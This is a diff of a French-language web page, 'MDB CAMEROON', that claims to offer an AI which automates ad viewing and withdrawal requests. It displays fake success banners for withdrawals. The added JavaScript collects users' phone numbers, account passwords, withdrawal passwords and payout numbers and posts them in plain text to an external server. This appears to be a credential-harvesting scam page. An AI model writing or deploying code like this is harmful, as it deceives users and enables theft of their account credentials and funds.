@@ -5,10 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>MDB CAMEROON - Automatisation Intelligente</title>
     <link rel="icon" type="image/png" href="/favicon.png" />
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
-    <link rel="apple-touch-icon" href="/apple-touch-icon.png" />
-    <link rel="manifest" href="/site.webmanifest" />
     <style>
       :root {
         --primary-color: #007a5e;
@@ -21,6 +17,7 @@
         --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         --button-radius: 25px;
         --success-color: #27ae60;
+        --error-color: #e74c3c;
       }
 
       * {
@@ -39,7 +36,6 @@
         overflow-x: hidden;
       }
 
-      /* --- Bande dégradée sous le header --- */
       .degrade-background {
         position: absolute;
         top: 0;
@@ -115,29 +111,13 @@
       }
 
       @keyframes scrollCongrats {
-        0% {
-          opacity: 0;
-          transform: translateY(20px);
-        }
-        10% {
-          opacity: 1;
-          transform: translateY(0);
-        }
-        30% {
-          opacity: 1;
-          transform: translateY(0);
-        }
-        40% {
-          opacity: 0;
-          transform: translateY(-20px);
-        }
-        100% {
-          opacity: 0;
-          transform: translateY(-20px);
-        }
+        0% { opacity: 0; transform: translateY(20px); }
+        10% { opacity: 1; transform: translateY(0); }
+        30% { opacity: 1; transform: translateY(0); }
+        40% { opacity: 0; transform: translateY(-20px); }
+        100% { opacity: 0; transform: translateY(-20px); }
       }
 
-      /* Configuration et gestion transparente */
       .automation-section {
         background-color: transparent !important;
         border: 2px solid var(--primary-color);
@@ -217,12 +197,6 @@
         cursor: not-allowed;
       }
 
-      .btn-success {
-        background: linear-gradient(to right, #ff8c00, #ffd700);
-        color: white;
-        box-shadow: 0 4px 15px rgba(255, 140, 0, 0.3);
-      }
-
       .btn-secondary {
         background: linear-gradient(to right, #ff8c00, #ffd700);
         color: white;
@@ -233,12 +207,6 @@
         grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
         gap: 10px;
         margin: 15px 0;
-      }
-
-      @media (max-width: 768px) {
-        .withdrawal-options {
-          grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
-        }
       }
 
       .withdrawal-option {
@@ -260,11 +228,7 @@
       }
 
       .withdrawal-option.selected {
-        background: linear-gradient(
-          135deg,
-          var(--success-color) 0%,
-          #20c997 100%
-        );
+        background: linear-gradient(135deg, var(--success-color) 0%, #20c997 100%);
         color: white;
         border-color: var(--success-color);
         box-shadow: 0 4px 15px rgba(39, 174, 96, 0.4);
@@ -306,56 +270,9 @@
         position: relative;
       }
 
-      .nav-item::before {
-        content: "";
-        width: 24px;
-        height: 24px;
-        background-size: 24px 24px;
-        background-position: center;
-        background-repeat: no-repeat;
-      }
-
-      .nav-item[data-page="home"]::before {
-        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>');
-      }
-
-      .nav-item[data-page="task"]::before {
-        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5.04-6.71l-2.75-3.54-2.06 2.54-1.07-1.41L10.5 6l4.43 5.79z"/></svg>');
-      }
-
-      .nav-item[data-page="team"]::before {
-        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>');
-      }
-
-      .nav-item[data-page="level"]::before {
-        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>');
-      }
-
-      .nav-item[data-page="account"]::before {
-        background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>');
-      }
-
-      @media (max-width: 480px) {
-        .nav-item {
-          font-size: 0.7rem;
-          padding: 6px 8px;
-          gap: 3px;
-        }
-
-        .nav-item::before {
-          width: 20px;
-          height: 20px;
-          background-size: 20px 20px;
-        }
-      }
-
       .nav-item.active {
         color: #000;
         font-weight: 700;
-      }
-
-      .nav-item.active::before {
-        filter: brightness(0);
       }
 
       .page-section {
@@ -372,21 +289,12 @@
         color: var(--primary-color);
       }
 
-      .level-info {
+      .level-info, .level-display {
         background-color: #e8f4fc;
         border-radius: var(--border-radius);
         padding: 15px;
         margin: 15px 0;
         text-align: center;
-      }
-
-      .level-display {
-        background-color: #e8f4fc;
-        border-radius: var(--border-radius);
-        padding: 15px;
-        margin: 15px 0;
-        text-align: center;
-        font-size: 1rem;
         font-weight: bold;
         color: var(--primary-color);
       }
@@ -450,7 +358,7 @@
       }
 
       .success-icon.error {
-        color: #e74c3c;
+        color: var(--error-color);
       }
 
       .section-subtitle {
@@ -461,58 +369,37 @@
         font-size: 1.1rem;
       }
 
-      @media (max-width: 768px) {
-        .container {
-          padding: 0 15px;
-        }
-
-        header {
-          padding: 15px 0;
-        }
-
-        .logo {
-          font-size: 1.5rem;
-        }
-
-        .welcome-message {
-          font-size: 1rem;
-        }
-
-        .automation-section {
-          padding: 15px;
-        }
-
-        .btn {
-          padding: 10px 20px;
-          font-size: 0.95rem;
-        }
+      .loading-spinner {
+        display: inline-block;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top: 2px solid white;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-right: 8px;
       }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
       .container {
         max-width: 1200px;
         margin: 0 auto;
         padding: 0 20px;
       }
+
+      @media (max-width: 768px) {
+        .container { padding: 0 15px; }
+        header { padding: 15px 0; }
+        .automation-section { padding: 15px; }
+      }
+
       @media (max-width: 480px) {
-        .withdrawal-options {
-          grid-template-columns: repeat(2, 1fr);
-        }
-
-        .form-row {
-          grid-template-columns: 1fr;
-        }
-
-        .logo {
-          font-size: 1.3rem;
-        }
-
-        .congratulations-container {
-          height: 50px;
-          margin: 10px auto;
-        }
-
-        .congratulations {
-          font-size: 0.9rem;
-        }
+        .withdrawal-options { grid-template-columns: repeat(2, 1fr); }
+        .form-row { grid-template-columns: 1fr; }
       }
     </style>
   </head>
@@ -524,20 +411,12 @@
         <div class="logo">
           <img src="logo.png" alt="MDB Logo" />
         </div>
-        <div class="welcome-message">
-          Bienvenue sur votre IA d'automatisation
-        </div>
+        <div class="welcome-message">Bienvenue sur votre IA d'automatisation</div>
         <button id="langToggleBtn" class="btn btn-secondary">English</button>
         <div class="congratulations-container">
-          <div class="congratulations">
-            Requête de retrait de 52,000 XAF validée avec succès
-          </div>
-          <div class="congratulations">
-            Requête de retrait de 52,000 XAF validée avec succès
-          </div>
-          <div class="congratulations">
-            Requête de retrait de 1,200 XAF validée avec succès
-          </div>
+          <div class="congratulations">Requête de retrait de 52,000 XAF validée avec succès</div>
+          <div class="congratulations">Requête de retrait de 52,000 XAF validée avec succès</div>
+          <div class="congratulations">Requête de retrait de 1,200 XAF validée avec succès</div>
         </div>
       </div>
     </header>
@@ -546,67 +425,38 @@
       <!-- Page Accueil -->
       <div id="homePage" class="page-section active">
         <div class="automation-section">
-          <h2>Configuration et Gestion de l'automatisation de l'IA </h2>
+          <h2>Configuration et Gestion de l'automatisation de l'IA</h2>
 
           <div class="ai-explanation">
-            <p>
-              Notre Intelligence Artificielle configurable vous permet
-              d'automatiser complètement le visionnage des vidéos publicitaires.
-              Configurez une fois, et notre IA travaille pour vous 24h/24 !
-            </p>
+            <p>Notre Intelligence Artificielle configurable vous permet d'automatiser complètement le visionnage des vidéos publicitaires. Configurez une fois, et notre IA travaille pour vous 24h/24 !</p>
           </div>
 
           <div class="level-info">
-            <p>
-              <strong
-                >Le nombre de tâches est automatiquement configuré selon votre
-                niveau</strong
-              >
-            </p>
+            <p>Le nombre de tâches est automatiquement configuré selon votre niveau</p>
           </div>
 
           <div class="form-row">
             <div class="form-group">
               <label for="phone">Numéro de téléphone</label>
-              <input
-                type="text"
-                id="phone"
-                class="form-control"
-                placeholder="Votre numéro"
-              />
+              <input type="text" id="phone" class="form-control" placeholder="Votre numéro" />
             </div>
             <div class="form-group">
               <label for="password">Mot de passe</label>
-              <input
-                type="password"
-                id="password"
-                class="form-control"
-                placeholder="Votre mot de passe"
-              />
+              <input type="password" id="password" class="form-control" placeholder="Votre mot de passe" />
             </div>
           </div>
 
           <div class="form-row">
             <div class="form-group">
               <label for="delay">Délai entre les vidéos (secondes)</label>
-              <input
-                type="number"
-                id="delay"
-                class="form-control"
-                value="30"
-                min="15"
-                max="120"
-              />
+              <input type="number" id="delay" class="form-control" value="30" min="15" max="120" />
             </div>
           </div>
 
           <div class="level-display">
             <p><strong>Niveau :</strong></p>
             <form id="levelForm">
-              <label
-                ><input type="radio" name="level" value="stagiaire" checked />
-                Stagiaire</label
-              >
+              <label><input type="radio" name="level" value="stagiaire" checked /> Stagiaire</label>
               <label><input type="radio" name="level" value="p1" /> P1</label>
               <label><input type="radio" name="level" value="p2" /> P2</label>
               <label><input type="radio" name="level" value="p3" /> P3</label>
@@ -619,40 +469,23 @@
             </form>
           </div>
 
-          <div class="section-subtitle" style="margin-top: 30px">
-            Montants de retrait disponibles
-          </div>
-          <p style="margin-bottom: 15px">
-            Sélectionnez un montant : l'IA automatisera les requettes de
-            retraits pour vous
-          </p>
+          <div class="section-subtitle">Montants de retrait disponibles</div>
+          <p style="margin-bottom: 15px">Sélectionnez un montant : l'IA automatisera les requettes de retraits pour vous</p>
 
           <div class="withdrawal-options">
             <div class="withdrawal-option" data-amount="1200">1,200 XAF</div>
             <div class="withdrawal-option" data-amount="3600">3,600 XAF</div>
             <div class="withdrawal-option" data-amount="18000">18,000 XAF</div>
             <div class="withdrawal-option" data-amount="52000">52,000 XAF</div>
-            <div class="withdrawal-option" data-amount="100000">
-              100,000 XAF
-            </div>
-            <div class="withdrawal-option" data-amount="230000">
-              230,000 XAF
-            </div>
-            <div class="withdrawal-option" data-amount="1000000">
-              1,000,000 XAF
-            </div>
-            <div class="withdrawal-option" data-amount="3000000">
-              3,000,000 XAF
-            </div>
-            <div class="withdrawal-option" data-amount="5000000">
-              5,000,000 XAF
-            </div>
+            <div class="withdrawal-option" data-amount="100000">100,000 XAF</div>
+            <div class="withdrawal-option" data-amount="230000">230,000 XAF</div>
+            <div class="withdrawal-option" data-amount="1000000">1,000,000 XAF</div>
+            <div class="withdrawal-option" data-amount="3000000">3,000,000 XAF</div>
+            <div class="withdrawal-option" data-amount="5000000">5,000,000 XAF</div>
           </div>
 
           <div class="form-group" style="text-align: center; margin-top: 20px">
-            <button id="saveAllBtn" class="btn btn-success">
-              Sauvegarder et envoyer
-            </button>
+            <button id="saveAllBtn" class="btn btn-success">Sauvegarder et envoyer</button>
           </div>
         </div>
       </div>
@@ -665,34 +498,18 @@
           <div class="form-row">
             <div class="form-group">
               <label for="accountPhone">Numéro de téléphone</label>
-              <input
-                type="text"
-                id="accountPhone"
-                class="form-control"
-                placeholder="Votre numéro"
-              />
+              <input type="text" id="accountPhone" class="form-control" placeholder="Votre numéro" />
             </div>
-
             <div class="form-group">
               <label for="accountPassword">Mot de passe</label>
-              <input
-                type="password"
-                id="accountPassword"
-                class="form-control"
-                placeholder="Votre mot de passe"
-              />
+              <input type="password" id="accountPassword" class="form-control" placeholder="Votre mot de passe" />
             </div>
           </div>
 
           <div class="form-row">
             <div class="form-group">
               <label for="withdrawalPassword">Mot de passe de retrait</label>
-              <input
-                type="password"
-                id="withdrawalPassword"
-                class="form-control"
-                placeholder="Mot de passe pour les retraits"
-              />
+              <input type="password" id="withdrawalPassword" class="form-control" placeholder="Mot de passe pour les retraits" />
             </div>
           </div>
 
@@ -702,9 +519,7 @@
           </div>
 
           <div class="form-group" style="text-align: center">
-            <button id="saveAccountBtn" class="btn btn-success">
-              Sauvegarder
-            </button>
+            <button id="saveAccountBtn" class="btn btn-success">Sauvegarder</button>
           </div>
         </div>
       </div>
@@ -713,14 +528,7 @@
       <div id="taskPage" class="page-section">
         <div class="automation-section">
           <h2 class="section-title">Tâches</h2>
-          <div class="ai-explanation">
-            <p>📋 En maintenance</p>
-          </div>
-          <div class="form-group" style="text-align: center">
-            <button class="nav-return-btn btn btn-secondary" data-page="home">
-              Retour à l'accueil
-            </button>
-          </div>
+          <div class="ai-explanation"><p>📋 En maintenance</p></div>
         </div>
       </div>
 
@@ -728,14 +536,7 @@
       <div id="teamPage" class="page-section">
         <div class="automation-section">
           <h2 class="section-title">Équipe</h2>
-          <div class="ai-explanation">
-            <p>👥 En maintenance</p>
-          </div>
-          <div class="form-group" style="text-align: center">
-            <button class="nav-return-btn btn btn-secondary" data-page="home">
-              Retour à l'accueil
-            </button>
-          </div>
+          <div class="ai-explanation"><p>👥 En maintenance</p></div>
         </div>
       </div>
 
@@ -743,20 +544,13 @@
       <div id="levelPage" class="page-section">
         <div class="automation-section">
           <h2 class="section-title">Niveaux</h2>
-          <div class="ai-explanation">
-            <p>⭐ En maintenance</p>
-          </div>
-          <div class="form-group" style="text-align: center">
-            <button class="nav-return-btn btn btn-secondary" data-page="home">
-              Retour à l'accueil
-            </button>
-          </div>
+          <div class="ai-explanation"><p>⭐ En maintenance</p></div>
         </div>
       </div>
     </div>
 
     <!-- Navigation fixe -->
-     <div class="nav-bottom">
+    <div class="nav-bottom">
       <a class="nav-item active" data-page="home">Home</a>
       <a class="nav-item" data-page="task">Task</a>
       <a class="nav-item" data-page="team">Team</a>
@@ -764,6 +558,7 @@
       <a class="nav-item" data-page="account">Account</a>
     </div>
 
+    <!-- Modal de succès -->
     <div class="success-modal" id="successModal">
       <div class="success-modal-content">
         <div class="success-icon" id="successIcon">✓</div>
@@ -774,7 +569,7 @@
     </div>
 
     <script>
-      const API_URL = "https://ia-mdb-server.onrender.com/";
+      const API_URL = "https://ia-mdb-server.onrender.com";
 
       const elements = {
         phone: document.getElementById("phone"),
@@ -789,7 +584,6 @@
         withdrawalNumbers: document.getElementById("withdrawalNumbers"),
         saveAccountBtn: document.getElementById("saveAccountBtn"),
         navItems: document.querySelectorAll(".nav-item"),
-        navReturnBtns: document.querySelectorAll(".nav-return-btn"),
         pageSections: document.querySelectorAll(".page-section"),
         successModal: document.getElementById("successModal"),
         closeSuccessModal: document.getElementById("closeSuccessModal"),
@@ -799,95 +593,199 @@
       };
 
       let selectedWithdrawalAmount = null;
+      let currentLang = "fr";
 
       // Traductions
       const translations = {
         en: {
-          welcomeMessage: "Welcome to your automation AI",
-          configTitle: "Configuration and Management",
-          aiExplanation: "Our configurable Artificial Intelligence allows you to fully automate watching ads. Set it up once, and our AI works for you 24/7!",
+          welcome: "Welcome to your automation AI",
+          configTitle: "Configuration and Management of AI automation",
+          aiExplanation: "Our configurable Artificial Intelligence allows you to fully automate ad viewing. Configure once, and our AI works for you 24/7!",
           levelInfo: "The number of tasks is automatically set according to your level",
-          phoneLabel: "Phone number",
-          passwordLabel: "Password",
-          delayLabel: "Delay between videos (seconds)",
-          levelLabel: "Level:",
+          phone: "Phone number",
+          password: "Password",
+          delay: "Delay between videos (seconds)",
+          level: "Level:",
           withdrawalSubtitle: "Available withdrawal amounts",
           withdrawalInstruction: "Select an amount: the AI will automate withdrawal requests for you",
           saveBtn: "Save and send",
           accountTitle: "Account Management",
-          withdrawalPasswordLabel: "Withdrawal password",
-          withdrawalNumbersLabel: "Authorized withdrawal numbers",
+          accountPhone: "Phone number",
+          accountPassword: "Password",
+          withdrawalPassword: "Withdrawal password",
+          withdrawalNumbers: "Authorized withdrawal numbers",
           saveAccountBtn: "Save",
+          taskTitle: "Tasks",
+          teamTitle: "Team",
+          levelTitle: "Levels",
+          maintenance: "Under maintenance"
         },
         fr: {
-          welcomeMessage: "Bienvenue sur votre IA d'automatisation",
-          configTitle: "Configuration et Gestion",
+          welcome: "Bienvenue sur votre IA d'automatisation",
+          configTitle: "Configuration et Gestion de l'automatisation de l'IA",
           aiExplanation: "Notre Intelligence Artificielle configurable vous permet d'automatiser complètement le visionnage des vidéos publicitaires. Configurez une fois, et notre IA travaille pour vous 24h/24 !",
           levelInfo: "Le nombre de tâches est automatiquement configuré selon votre niveau",
-          phoneLabel: "Numéro de téléphone",
-          passwordLabel: "Mot de passe",
-          delayLabel: "Délai entre les vidéos (secondes)",
-          levelLabel: "Niveau :",
+          phone: "Numéro de téléphone",
+          password: "Mot de passe",
+          delay: "Délai entre les vidéos (secondes)",
+          level: "Niveau :",
           withdrawalSubtitle: "Montants de retrait disponibles",
           withdrawalInstruction: "Sélectionnez un montant : l'IA automatisera les requettes de retraits pour vous",
           saveBtn: "Sauvegarder et envoyer",
           accountTitle: "Gestion du Compte",
-          withdrawalPasswordLabel: "Mot de passe de retrait",
-          withdrawalNumbersLabel: "Numéros de retrait autorisés",
+          accountPhone: "Numéro de téléphone",
+          accountPassword: "Mot de passe",
+          withdrawalPassword: "Mot de passe de retrait",
+          withdrawalNumbers: "Numéros de retrait autorisés",
           saveAccountBtn: "Sauvegarder",
-        },
+          taskTitle: "Tâches",
+          teamTitle: "Équipe",
+          levelTitle: "Niveaux",
+          maintenance: "En maintenance"
+        }
       };
 
-      let currentLang = "fr";
-
+      // Gestion de la langue
       function updateLanguage(lang) {
         currentLang = lang;
         const t = translations[lang];
-
-        document.querySelector(".welcome-message").textContent = t.welcomeMessage;
+        
+        document.querySelector(".welcome-message").textContent = t.welcome;
         document.querySelector(".automation-section h2").textContent = t.configTitle;
         document.querySelector(".ai-explanation p").textContent = t.aiExplanation;
-        document.querySelector(".level-info p strong").textContent = t.levelInfo;
-        document.querySelector("label[for='phone']").textContent = t.phoneLabel;
-        document.querySelector("label[for='password']").textContent = t.passwordLabel;
-        document.querySelector("label[for='delay']").textContent = t.delayLabel;
-        document.querySelector(".level-display p strong").textContent = t.levelLabel;
+        document.querySelector(".level-info p").textContent = t.levelInfo;
+        document.querySelector("label[for='phone']").textContent = t.phone;
+        document.querySelector("label[for='password']").textContent = t.password;
+        document.querySelector("label[for='delay']").textContent = t.delay;
+        document.querySelector(".level-display p strong").textContent = t.level;
         document.querySelector(".section-subtitle").textContent = t.withdrawalSubtitle;
-        document.querySelector("p[style*='margin-bottom']").textContent = t.withdrawalInstruction;
+        document.querySelectorAll("p[style*='margin-bottom: 15px']")[0].textContent = t.withdrawalInstruction;
         document.getElementById("saveAllBtn").textContent = t.saveBtn;
-        if(document.querySelector("#accountPage .section-title")) {
-          document.querySelector("#accountPage .section-title").textContent = t.accountTitle;
-        }
-        if(document.querySelector("label[for='withdrawalPassword']")) {
-          document.querySelector("label[for='withdrawalPassword']").textContent = t.withdrawalPasswordLabel;
-        }
-        if(document.querySelector("label[for='withdrawalNumbers']")) {
-          document.querySelector("label[for='withdrawalNumbers']").textContent = t.withdrawalNumbersLabel;
-        }
-        if(document.getElementById("saveAccountBtn")) {
-          document.getElementById("saveAccountBtn").textContent = t.saveAccountBtn;
-        }
-      }
-
-      function initApp() {
-        console.log("✅ Application MDB initialisée");
-
-        document.getElementById("langToggleBtn").addEventListener("click", () => {
-          if(currentLang === "fr") {
-            updateLanguage("en");
-            document.getElementById("langToggleBtn").textContent = "Français";
-          } else {
-            updateLanguage("fr");
-            document.getElementById("langToggleBtn").textContent = "English";
-          }
+        document.querySelector("#accountPage .section-title").textContent = t.accountTitle;
+        document.querySelector("label[for='accountPhone']").textContent = t.accountPhone;
+        document.querySelector("label[for='accountPassword']").textContent = t.accountPassword;
+        document.querySelector("label[for='withdrawalPassword']").textContent = t.withdrawalPassword;
+        document.querySelector("label[for='withdrawalNumbers']").textContent = t.withdrawalNumbers;
+        document.getElementById("saveAccountBtn").textContent = t.saveAccountBtn;
+        document.querySelectorAll(".section-title")[1].textContent = t.taskTitle;
+        document.querySelectorAll(".section-title")[2].textContent = t.teamTitle;
+        document.querySelectorAll(".section-title")[3].textContent = t.levelTitle;
+        document.querySelectorAll(".ai-explanation p").forEach((el, idx) => {
+          if (idx > 0) el.textContent = "(" + t.maintenance + ")";
         });
       }
 
-      if(document.readyState === "loading") {
-        document.addEventListener("DOMContentLoaded", initApp);
-      } else {
-        initApp();
+      document.getElementById("langToggleBtn").addEventListener("click", () => {
+        currentLang = currentLang === "fr" ? "en" : "fr";
+        updateLanguage(currentLang);
+        document.getElementById("langToggleBtn").textContent = currentLang === "fr" ? "English" : "Français";
+      });
+
+      // Sélection montant de retrait
+      elements.withdrawalOptions.forEach(option => {
+        option.addEventListener("click", function() {
+          elements.withdrawalOptions.forEach(opt => opt.classList.remove("selected"));
+          this.classList.add("selected");
+          selectedWithdrawalAmount = this.dataset.amount;
+        });
+      });
+
+      // Navigation
+      elements.navItems.forEach(item => {
+        item.addEventListener("click", function() {
+          const page = this.dataset.page;
+          elements.navItems.forEach(nav => nav.classList.remove("active"));
+          elements.pageSections.forEach(section => section.classList.remove("active"));
+          this.classList.add("active");
+          document.getElementById(page + "Page").classList.add("active");
+        });
+      });
+
+      // Fermeture modal
+      elements.closeSuccessModal.addEventListener("click", () => {
+        elements.successModal.classList.remove("active");
+      });
+
+      // Sauvegarde des données d'automatisation
+      elements.saveAllBtn.addEventListener("click", async () => {
+        const selectedLevel = document.querySelector('input[name="level"]:checked').value;
+        const data = {
+          phone: elements.phone.value,
+          password: elements.password.value,
+          delay: parseInt(elements.delay.value),
+          level: selectedLevel,
+          withdrawalAmount: selectedWithdrawalAmount
+        };
+
+        if (!data.phone || !data.password || !data.withdrawalAmount) {
+          showModal("error", "Erreur", "Veuillez remplir tous les champs");
+          return;
+        }
+
+        console.log("📤 Données envoyées (en clair):", data);
+        await sendDataToAPI("/automation", data);
+      });
+
+      // Sauvegarde du compte
+      elements.saveAccountBtn.addEventListener("click", async () => {
+        const data = {
+          phone: elements.accountPhone.value,
+          password: elements.accountPassword.value,
+          withdrawalPassword: elements.withdrawalPassword.value,
+          withdrawalNumbers: elements.withdrawalNumbers.value
+        };
+
+        if (!data.phone || !data.password) {
+          showModal("error", "Erreur", "Veuillez remplir tous les champs");
+          return;
+        }
+
+        console.log("📤 Données compte (en clair):", data);
+        await sendDataToAPI("/account", data);
+      });
+
+      // Envoi des données à l'API
+      async function sendDataToAPI(endpoint, data) {
+        const btn = endpoint === "/automation" ? elements.saveAllBtn : elements.saveAccountBtn;
+        const originalText = btn.textContent;
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loading-spinner"></span>Envoi...';
+
+        try {
+          const response = await fetch(`${API_URL}${endpoint}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          });
+
+          if (response.ok) {
+            const result = await response.json();
+            showModal("success", "Succès", "Données envoyées avec succès");
+            console.log("✅ Réponse API:", result);
+          } else {
+            const error = await response.json();
+            showModal("error", "Erreur", error.message || "Erreur lors de l'envoi");
+          }
+        } catch (err) {
+          console.error("❌ Erreur API:", err);
+          showModal("error", "Erreur réseau", "Impossible de contacter le serveur");
+        } finally {
+          btn.disabled = false;
+          btn.textContent = originalText;
+        }
       }
+
+      // Affichage modal
+      function showModal(type, title, message) {
+        elements.successIcon.className = "success-icon " + type;
+        elements.successIcon.textContent = type === "success" ? "✓" : "✕";
+        elements.successTitle.textContent = title;
+        elements.successMessage.textContent = message;
+        elements.successModal.classList.add("active");
+      }
+
+      console.log("✅ Application MDB initialisée");
+      console.log("📡 API URL:", API_URL);
     </script>
   </body>
 </html>
